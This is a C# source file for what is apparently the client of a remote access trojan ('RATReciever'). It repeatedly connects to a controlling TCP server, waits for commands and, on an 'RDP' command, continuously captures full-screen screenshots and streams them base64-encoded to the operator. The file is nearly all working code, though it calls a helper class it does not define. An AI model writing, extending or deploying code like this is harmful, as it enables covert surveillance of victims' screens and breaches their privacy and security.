using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
//using System.Threading.Tasks;
using System.Threading;
using System.Net;
using System.Net.Sockets;
using System.IO;
using System.Drawing;
using System.Windows.Forms;
using System.Drawing.Imaging;
namespace RATReciever
{
    class Program
    {
        /// <summary>
        /// Global Declares
        /// </summary>
        static bool Recieved = false;
        static NetworkStream NS;
        static StreamWriter SW;
        static StreamReader SR;
        static TcpClient TCPClient;
        static StringBuilder Input;
        static Thread ConnectThread;
        static bool rdp = false;
        static int i = 1;
        
        /// <summary>
        /// Main function starts connect thread
        /// </summary>
        /// <param name="args"></param>
        static void Main(string[] args)
        {
            //TCPClient.ReceiveTimeout = 10000;
            ConnectThread = new Thread(Client);
            ConnectThread.Start();
            Console.ReadLine();
        }

        /// <summary>
        /// Checks if connected..If not it runs the the connection thread. 
        /// Once connection established it listens for commands
        /// </summary>
        static void Client()
        {


            for (; ; )
            {

                if (!IsConnected())
                    Connect();

                try
                {
                    // Console.WriteLine(SR.ReadLine());
                    Listen();

                }

                catch
                {
                    Console.WriteLine("Connection Lost :(");
                }

                Thread.Sleep(1000);
            }
        }


        /// <summary>
        /// Listens and executes commands
        /// </summary>
        static void Listen()
        {
            string Command = SR.ReadLine();
            switch (Command)
            {
                case "RDP":
                    Console.WriteLine("lolk");
                    rdp = true;
                    Thread FunctionThread = new Thread(RemoteDesktop);
                    FunctionThread.Start();
                    break;

                default:
                    break;

            }
        }

        /// <summary>
        /// Checks if connected- returns boolean
        /// </summary>
        /// <returns></returns>
        static bool IsConnected()
        {
            try
            {
                if (!TCPClient.Connected)
                {
                    return false;
                }
                return true;
            }

            catch
            {
                Console.WriteLine("Starting Connection");
                return false;
            }
        }

        /// <summary>
        /// Attempts to close any existing connections if that fails creates a new connection and connects to server.
        /// Once connected it then creates all the stream to exchange dat
        /// </summary>
        static void Connect()
        {
            try
            {
                TCPClient.Close();
                SR.Close();
                SW.Close();
            }
            catch { }
           
            TCPClient = new TcpClient();
            while (!TCPClient.Connected)
            {
                try
                {
                    TCPClient.Connect("localhost", 58899);
                    Thread.Sleep(1000);
                }
                catch { }
            }

            Console.WriteLine("Connection Established!");
            NS = TCPClient.GetStream();
            SR = new StreamReader(NS);
            SW = new StreamWriter(NS);
            Input = new StringBuilder();
        }

        ////////////////////////////////////////////////////////////////////////
        ////////////////////////////Remote Desktop/////////////////////////////
        //////////////////////////////////////////////////////////////////////

        static void RemoteDesktop()
        {
            while (rdp)
            {
                try
                {
                    byte[] ImageBytes = Generics.Imaging.ImageToByte(Generics.Imaging.Get_ScreenShot_In_Bitmap());
                    string StreamData = "REMOTEDATA|***|" + Convert.ToBase64String(ImageBytes);
                    SW.WriteLine(StreamData);
                    SW.Flush();
                    Thread.Sleep(1);
                }

                catch { rdp = false; }
            }
        }
    }
}
